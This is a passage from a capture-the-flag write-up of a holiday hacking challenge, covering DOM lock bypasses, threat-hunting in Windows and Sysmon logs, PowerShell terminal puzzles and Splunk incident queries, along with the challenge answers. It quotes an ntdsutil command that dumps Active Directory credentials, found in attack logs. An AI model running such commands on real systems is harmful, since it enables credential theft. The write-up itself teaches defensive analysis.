<p>I google &lsquo;Firefox view event handlers&rsquo;. We read carefully and indeed, the inspector is showing an &lsquo;event&rsquo; tag. We click on the event tag and the javascript shows us that VERONICA is sad.</p>
</li>
<li>
<p>We lookup for chakra on the source code within the inspector, and as per instructed by the hint, a right-click on the span elements having class=chakras followed with changing the pseudo-class to active =&gt; one or couple letter revealed. We just iterate on all span elements.</p>
</li>
<li>
<p>we right click the last lock to see the DOM element. This lock has a cover with a disabled button. with the DOM inspector, we can select this div and delete it.
We find the code printed in the</p>
</li>
</ol>
<pre tabindex="0"><code>&lt;div class=&quot;component macaroni&quot; data-code=&quot;A33&quot;&gt;&lt;/div&gt;&lt;div class=&quot;component swab&quot; data-code=&quot;J39&quot;&gt;&lt;/div&gt;&lt;div class=&quot;component gnome&quot; data-code=&quot;XJ0&quot;&gt;
</code></pre><p>We successfully got the name of the Villain who is the &lsquo;Tooth Fairy&rsquo;. It was not necessary to open the crate neither to show the hidden crate box in the student union. However Shiny upatree keeps telling &lsquo;Hey there&rsquo; &hellip; maybe the challenge was not intended to be completed that way? Nevermind, we spent way too much time to figure out how to open the crate, so we will keep it for later.</p>
<h2 id="objective---windows-log-analysis-evaluate-attack-outcome">Objective - windows log analysis: evaluate attack outcome</h2>
<ul>
<li><a href="https://www.ericconrad.com/2016/09/deepbluecli-powershell-module-for-hunt.html">Eric Conrad Deep Blue CLI Posting</a></li>
<li><a href="https://github.com/sans-blue-team/DeepBlueCLI">Deep Blue Git</a></li>
</ul>
<p>Looking at the log through Eric Conrad threat hunting tool allows us to identify one user for whom there were one less failed attempts to connect. This is because the password spray attack was successful.
On windows: change execution policy as admin</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Set-ExecutionPolicy</span> -ExecutionPolicy Unrestricted
</code></pre></td></tr></table>
</div>
</div><p>Then download threat hunting too lfrom github</p>
<pre tabindex="0"><code>git clone https://github.com/sans-blue-team/DeepBlueCLI
.\DeepBlue.ps1 .\Security.evtx .\evtx\password-spray.evtx
</code></pre><h2 id="objective---windows-log-analysis-determine-attacker-technique">Objective - windows log analysis: determine attacker technique</h2>
<ul>
<li><a href="https://www.endgame.com/our-experts/ross-wolf">EQL blog</a></li>
<li><a href="https://pen-testing.sans.org/blog/2019/12/10/eql-threat-hunting/">EQL Threat Hunting</a></li>
<li><a href="https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon">Sysmon by Carlos Perez</a></li>
</ul>
<p>We install eql and we search for *process_name <code>lsass.exe</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">pip<span style="color:#bd93f9">3</span> install eql
eql query -f .\sysmon-data.json <span style="color:#f1fa8c">&#34;parent_process_name == &#39;lsass.exe&#39;&#34;</span>
{<span style="color:#ff79c6">&#34;command_line&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\system32\\cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;event_type&#34;</span>: <span style="color:#f1fa8c">&#34;process&#34;</span>, <span style="color:#ff79c6">&#34;logon_id&#34;</span>: <span style="color:#bd93f9">999</span>, <span style="color:#ff79c6">&#34;parent_process_name&#34;</span>: <span style="color:#f1fa8c">&#34;lsass.exe&#34;</span>, <span style="color:#ff79c6">&#34;parent_process_path&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\lsass.exe&#34;</span>, <span style="color:#ff79c6">&#34;pid&#34;</span>: <span style="color:#bd93f9">3440</span>, <span style="color:#ff79c6">&#34;ppid&#34;</span>: <span style="color:#bd93f9">632</span>, <span style="color:#ff79c6">&#34;process_name&#34;</span>: <span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;process_path&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;subtype&#34;</span>: <span style="color:#f1fa8c">&#34;create&#34;</span>, <span style="color:#ff79c6">&#34;timestamp&#34;</span>: <span style="color:#bd93f9">132186398356220000</span>, <span style="color:#ff79c6">&#34;unique_pid&#34;</span>: <span style="color:#f1fa8c">&#34;{7431d376-dedb-5dd3-0000-001027be4f00}&#34;</span>, <span style="color:#ff79c6">&#34;unique_ppid&#34;</span>: <span style="color:#f1fa8c">&#34;{7431d376-cd7f-5dd3-0000-001013920000}&#34;</span>, <span style="color:#ff79c6">&#34;user&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY\\SYSTEM&#34;</span>, <span style="color:#ff79c6">&#34;user_domain&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY&#34;</span>, <span style="color:#ff79c6">&#34;user_name&#34;</span>: <span style="color:#f1fa8c">&#34;SYSTEM&#34;</span>}
</code></pre></td></tr></table>
</div>
</div><p>Once the process identified we take the pid to search children processes, and we identify ntdsutil.exe</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">eql query -f .\sysmon-data.json <span style="color:#f1fa8c">&#34;ppid == 3440&#34;</span>
{<span style="color:#ff79c6">&#34;command_line&#34;</span>: <span style="color:#f1fa8c">&#34;ntdsutil.exe  \&#34;ac i ntds\&#34; ifm \&#34;create full c:\\hive\&#34; q q&#34;</span>, <span style="color:#ff79c6">&#34;event_type&#34;</span>: <span style="color:#f1fa8c">&#34;process&#34;</span>, <span style="color:#ff79c6">&#34;logon_id&#34;</span>: <span style="color:#bd93f9">999</span>, <span style="color:#ff79c6">&#34;parent_process_name&#34;</span>: <span style="color:#f1fa8c">&#34;cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;parent_process_path&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\cmd.exe&#34;</span>, <span style="color:#ff79c6">&#34;pid&#34;</span>: <span style="color:#bd93f9">3556</span>, <span style="color:#ff79c6">&#34;ppid&#34;</span>: <span style="color:#bd93f9">3440</span>, <span style="color:#ff79c6">&#34;process_name&#34;</span>: <span style="color:#f1fa8c">&#34;ntdsutil.exe&#34;</span>, <span style="color:#ff79c6">&#34;process_path&#34;</span>: <span style="color:#f1fa8c">&#34;C:\\Windows\\System32\\ntdsutil.exe&#34;</span>, <span style="color:#ff79c6">&#34;subtype&#34;</span>: <span style="color:#f1fa8c">&#34;create&#34;</span>, <span style="color:#ff79c6">&#34;timestamp&#34;</span>: <span style="color:#bd93f9">132186398470300000</span>, <span style="color:#ff79c6">&#34;unique_pid&#34;</span>: <span style="color:#f1fa8c">&#34;{7431d376-dee7-5dd3-0000-0010f0c44f00}&#34;</span>, <span style="color:#ff79c6">&#34;unique_ppid&#34;</span>: <span style="color:#f1fa8c">&#34;{7431d376-dedb-5dd3-0000-001027be4f00}&#34;</span>, <span style="color:#ff79c6">&#34;user&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY\\SYSTEM&#34;</span>, <span style="color:#ff79c6">&#34;user_domain&#34;</span>: <span style="color:#f1fa8c">&#34;NT AUTHORITY&#34;</span>, <span style="color:#ff79c6">&#34;user_name&#34;</span>: <span style="color:#f1fa8c">&#34;SYSTEM&#34;</span>}
</code></pre></td></tr></table>
</div>
</div><h2 id="powershell">Powershell</h2>
<ul>
<li><a href="https://blogs.sans.org/pen-testing/files/2016/05/PowerShellCheatSheet_v41.pdf">SANS Powershell Cheat Sheet</a></li>
</ul>
<p>List all env variables, we find a <code>riddle</code> variable:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Get-Content</span> /home/call...
<span style="color:#8be9fd;font-style:italic">Get-History</span>
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> http://127.0.0.1:1225/api/off).RawContent
<span style="color:#8be9fd;font-style:italic">Invoke-History</span> -ID 7
<span style="color:#8be9fd;font-style:italic">Invoke-History</span> -ID 9
(<span style="color:#8be9fd;font-style:italic">Get-ChildItem</span> env:riddle).Value
<span style="color:#8be9fd;font-style:italic">gci </span>-rec <span style="color:#ff79c6">-file</span> /etc | <span style="color:#8be9fd;font-style:italic">sort </span>LastWriteTime
</code></pre></td></tr></table>
</div>
</div><p>last file is an archive:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Expand-Archive</span> /etc/apt/archive  -DestinationPath ./archive
chmod +x ./runme.elf
./runme.elf
</code></pre></td></tr></table>
</div>
</div><p>set refraction?val=1.867</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> -Uri http://localhost:1225/api/refraction<span style="color:#ff79c6">?</span>val=1.867).RawContent
</code></pre></td></tr></table>
</div>
</div><p>We are informed to search recursively for the hash &lsquo;25520151A320B5B0D21561F92C8F6224&rsquo; in the home folder</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">$goodHashes</span> = @(
    <span style="color:#f1fa8c">&#39;25520151A320B5B0D21561F92C8F6224&#39;</span>
)
(<span style="color:#8be9fd;font-style:italic">gci </span>-rec <span style="color:#ff79c6">-file</span> . | <span style="color:#8be9fd;font-style:italic">Get-FileHash</span> -Algorithm MD5 | <span style="color:#8be9fd;font-style:italic">Where-Object</span> { <span style="color:#8be9fd;font-style:italic">$_</span>.Hash -in <span style="color:#8be9fd;font-style:italic">$goodHashes</span> }).Path
</code></pre></td></tr></table>
</div>
</div><p>Read content of the file</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Get-Content</span> /home/elf/depths/produce/thhy5hll.txt
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> -Uri http://localhost:1225/api/temperature<span style="color:#ff79c6">?</span>val=-33.5).RawContent
</code></pre></td></tr></table>
</div>
</div><p>we are now instructed to find the longest file name</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#8be9fd;font-style:italic">gci </span>-rec <span style="color:#ff79c6">-file</span> . | <span style="color:#8be9fd;font-style:italic">select </span>Fullname,@{Name=<span style="color:#f1fa8c">&#34;NameLength&#34;</span>;Expression={<span style="color:#8be9fd;font-style:italic">$_</span>.fullname.length}} | <span style="color:#8be9fd;font-style:italic">sort </span>NameLength -Descending | <span style="color:#8be9fd;font-style:italic">select </span>-first 1).FullName
<span style="color:#8be9fd;font-style:italic">Get-Content</span> /home/elf/depths/larger/cloud/behavior/beauty/enemy/produce/age/chair/unknown/escape/vote/long/writer/behind/ahead/thin/occasionally/explore/tape/wherever/practical/therefore/cool/plate/ice/play/truth/potatoes/beauty/fourth/careful/dawn/adult/either/burn/<span style="color:#ff79c6">end</span>/accurate/rubbed/cake/main/she/threw/eager/trip/to/soon/think/fall/is/greatest/become/accident/labor/sail/dropped/fox/0jhj5xz6.txt
</code></pre></td></tr></table>
</div>
</div><p>We are now inform to add username in Get-Process output and kill processes in a certain order</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">Get-Process</span> -IncludeUsername
<span style="color:#8be9fd;font-style:italic">Stop-Process</span> -ID 24
<span style="color:#8be9fd;font-style:italic">Stop-Process</span> -ID 25
<span style="color:#8be9fd;font-style:italic">Stop-Process</span> -ID 27
<span style="color:#8be9fd;font-style:italic">Stop-Process</span> -ID 29
<span style="color:#8be9fd;font-style:italic">Get-Content</span> /shall/see
</code></pre></td></tr></table>
</div>
</div><p>Get the .xml children of /etc - an event log to be found.</p>
<p>Group all .Id&rsquo;s and the last thing will be in the Properties of the lonely unique event Id.</p>
<p>we are now informed to look for an xml event log file somewhere in /etc</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell"><span style="color:#8be9fd;font-style:italic">gci </span> /etc  -rec <span style="color:#ff79c6">-file</span> -filter *.xml
<span style="color:#6272a4">#$xml = Get-Content /etc/systemd/system/timers.target.wants/EventLog.xml</span>
<span style="color:#8be9fd;font-style:italic">$MyNamespace</span> = @{o = <span style="color:#f1fa8c">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span>}
(<span style="color:#8be9fd;font-style:italic">Select-Xml</span> -path /etc/systemd/system/timers.target.wants/EventLog.xml -Namespace <span style="color:#8be9fd;font-style:italic">$MyNamespace</span> -Xpath <span style="color:#f1fa8c">&#34;//o:I32[@N[contains(., &#39;Id&#39;)]]&#34;</span>).Node.InnerText | <span style="color:#8be9fd;font-style:italic">Group-Object</span> | <span style="color:#8be9fd;font-style:italic">Sort-Object</span> Count
</code></pre></td></tr></table>
</div>
</div><p>We find that the unique Id = 1</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">(<span style="color:#8be9fd;font-style:italic">Select-Xml</span> -Namespace <span style="color:#8be9fd;font-style:italic">$MyNamespace</span> -path /etc/systemd/system/timers.target.wants/EventLog.xml -Xpath <span style="color:#f1fa8c">&#34;//o:Obj[o:Props/o:I32[@N=&#39;Id&#39;] = &#39;1&#39;]/o:Props&#34;</span>) | <span style="color:#ff79c6">foreach</span> { <span style="color:#8be9fd;font-style:italic">$_</span>.Node.InnerText}
<span style="color:#6272a4">#$correct_gases_postbody = @{`n    O=6`n    H=7`n    He=3`n    N=4`n    Ne=22`n    Ar=11`n    Xe=10`n    F=20`n    Kr=8`n    Rn=9`n}`n</span>
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> -Method POST -BODY <span style="color:#f1fa8c">&#34;O=6&amp;H=7&amp;He=3&amp;N=4&amp;Ne=22&amp;Ar=11&amp;Xe=10&amp;F=20&amp;Kr=8&amp;Rn=9&#34;</span> -Uri http://localhost:1225/api/gas).RawContent
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> http://127.0.0.1:1225/api/on).RawContent
(<span style="color:#8be9fd;font-style:italic">Invoke-WebRequest</span> http://127.0.0.1:1225/api/output).RawContent
</code></pre></td></tr></table>
</div>
</div><h2 id="splunk">SPLUNK</h2>
<p>We are invited to connect <code>https://splunk.elfu.org</code> with username <code>elf</code> and password <code>elfsocks</code>. Once connected we go through a chat with different SOC stakeholders trying to respond an incident. We have to answer one challenge question and 7 training questions. First answer is in the chat, but other questions requires us to download a splunk file.</p>
<ul>
<li>Splunk is located there: <a href="https://www.youtube.com/watch?v=qbIhHhRKQCw">Splunk</a>
<ul>
<li>listing types of data in Splunk
<ul>
<li><code>|metadata type=sourcetypes</code></li>
<li><code>| tstats values(sourcetype) where index=*</code></li>
</ul>
</li>
<li>PIDs are in hex</li>
<li>sourcetype=wineventlog EventCode=4688 &ndash;&gt; Process auditing with full command-line and arguments</li>
<li>index=main sourcetype=&ldquo;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&rdquo; | stats count by EventCode, EventDescription | sort -count</li>
<li>pivoting in time -&gt; click timestamp and appluy +/- 5 seconds</li>
</ul>
</li>
<li><a href="https://www.splunk.com/en_us/blog/security/a-salacious-soliloquy-on-sysmon.html">Sysmon</a>
<ul>
<li>Olaf Hartong&rsquo;s config file for Sysmon (to be googled)</li>
</ul>
</li>
<li>Stoq
<ul>
<li><a href="https://stoq.punchcyber.com/">Stoq website</a></li>
<li><a href="https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1492181136.pdf">SANS pdf talk</a></li>
</ul>
</li>
</ul>
<h3 id="training-quetions">training quetions:</h3>
<ol>
<li>
<p>sweetums</p>
</li>
<li>
<p>C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt</p>
<pre><code>index=main cbanas sourcetype=&quot;WinEventLog:Microsoft-Windows-Powershell/Operational&quot; ParameterBinding*Get_Item*=&quot;\*&quot;
| top 100 ParameterBinding*Get_Item*
</code></pre>
</li>
<li>
<p>144.202.46.214.vultr.com</p>
<pre><code>index=main sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; dest=&quot;\*&quot; | top 10 dest
</code></pre>
</li>
<li>
<p>19th Century Holiday Cheer Assignment.docm</p>
<ul>
<li>
<p>Look for powershell script:</p>
<pre><code>index=main sourcetype=&quot;WinEventLog:Microsoft-Windows-Powershell/Operational&quot; | reverse
</code></pre>
</li>
<li>
<p>click on the date/timestamp from that first event, and specify a time window.
Accept the default of +/- five seconds, them remove sourcetype and reverse</p>
<pre><code>index=main sourcetype=WinEventLog EventCode=4688
</code></pre>
</li>
<li>
<p>hex PIDs are 0x2248=8776 child_of 0x16e8=5864 child of 0xc10=3088, New_Process_ID is in hex while sysmon process_id is in decimal, so we have to convert those hex value into a decimal</p>
<pre><code>index=main sourcetype=WinEventLog EventCode=4688 | eval hex_convert_pid=tonumber(New_Process_ID,16)
index=main process_id=&quot;5864&quot; | stats count by file_path
</code></pre>
</li>
<li>
<p>will list three files but those are not the parent powershell script</p>
<pre><code>index=main process_id=&quot;5864&quot; eventtype=&quot;ms-sysmon-process&quot;` we find the parent_process_id = 3088
</code></pre>
</li>
<li>
<p>there is a powershell payload encoded in base64 =&gt; <code>payload.decode('base64').replace('\x00','').lower()</code></p>
</li>
<li>
<p>All the above PIDs did not help, instead setting the time filter to show all events before the powershell script call,
then look for <code>EventCode=4688</code> and used <code>| reverse</code> to order by time desc.
Going back in time until we find a sysmon event with a <code>Process_Command_Line</code> containing a weird <code>\*.docm</code> in a zipfile.</p>
<pre><code>New_Process_Id = 0x187c
</code></pre>
</li>
</ul>
</li>
<li>
<p>21 unique email addresses</p>
<ul>
<li>
<p>Find file attachments</p>
<pre><code>index=main sourcetype=stoq
| eval results=spath(\_raw,&quot;results{}&quot;)
| mvexpand results
| eval path=spath(results, &quot;archivers.filedir.path&quot;), filename=spath(results,&quot;payload_meta.extra_data.filename&quot;), fullpath=path.&quot;/&quot;.filename
| search fullpath!=&quot;&quot;
| table filename,fullpath
</code></pre>
</li>
<li>
<p>Find emails</p>
<pre><code>index=main sourcetype=stoq
| table \_time results{}.workers.smtp.to results{}.workers.smtp.from results{}.workers.smtp.subject results{}.workers.smtp.body
| sort - \_time
</code></pre>
</li>
<li>
<p>Find all students having submitted their assignments:</p>
<pre><code>index=main sourcetype=stoq results{}.workers.smtp.subject=&quot;holiday cheer assignment submission&quot;
| table results{}.workers.smtp.from
</code></pre>
</li>
</ul>
</li>
<li>
<p>123456789</p>
<pre><code>index=main sourcetype=stoq results{}.payload_meta.extra_data.filename=&quot;\*zip&quot; results{}.workers.smtp.subject=&quot;holiday cheer assignment submission&quot;
| table results{}.workers.smtp.body
</code></pre>
</li>
<li>
<p><a href="mailto:bradly.buttercups@eifu.org">bradly.buttercups@eifu.org</a></p>
</li>
</ol>
<h3 id="challenge-question">challenge question:</h3>
<p>the solution is: <strong>Kent you are so unfair. And we were going to make you the king of the Winter Carnival.</strong></p>
<pre><code>index=main sourcetype=stoq &quot;results{}.workers.smtp.from&quot;=&quot;bradly buttercups &lt;bradly.buttercups@eifu.org&gt;&quot;

index=main sourcetype=stoq &quot;results{}.workers.smtp.from&quot;=&quot;bradly buttercups &lt;bradly.buttercups@eifu.org&gt;&quot;
  | eval results = spath(\_raw, &quot;results{}&quot;)
  | mvexpand results
  | eval path=spath(results, &quot;archivers.filedir.path&quot;), filename=spath(results, &quot;payload_meta.extra_data.filename&quot;), fullpath=path.&quot;/&quot;.filename
  | search fullpath!=&quot;&quot;
  | table filename,fullpath
</code></pre>
<ul>
<li>We find an interested core.xml file that we found on the File Archive &hellip; happy news, it cointains the message to Kent</li>
</ul>
